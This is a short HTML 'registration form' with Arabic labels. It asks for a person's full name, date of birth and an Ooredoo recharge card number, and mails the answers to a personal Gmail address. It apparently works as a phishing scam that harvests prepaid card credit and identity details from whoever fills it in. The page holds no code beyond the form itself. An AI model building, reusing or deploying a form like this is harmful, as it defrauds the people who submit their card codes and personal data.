!DOCTYPE html>
<html>
<head>
  <title>نموذج التسجيل</title>
  <style>
    

    form {
      background: rgba(255, 255, 255, 0.7);
      padding: 60px;
      border-radius: 60px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 500px;
    }

    h2 {
      text-align: center;
      color: #333;
    }

    label {
      display: block;
      margin-bottom: 5px;
      color: #333;
    }

    input[type="text"], input[type="submit"] {
      width: 100%;
      height: 50px;
      padding: 8px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

  <form action="mailto:wided.mee@gmail.com" method="post" enctype="text/plain">
    <h2>نموذج التسجيل</h2>
    <label for="fullName">الاسم واللقب:</label>
    <input type="text" id="fullName" name="fullName"><br><br>
    
    <label for="dob">تاريخ الولادة:</label>
    <input type="text" id="dob" name="dob"><br><br>
    
    <label for="ooredooCard">بطاقة شحن Ooredoo:</label>
    <input type="text" id="ooredooCard" name="ooredooCard"><br><br>
    
    <input type="submit" value="إرسال">
  </form>

</body>
</html>
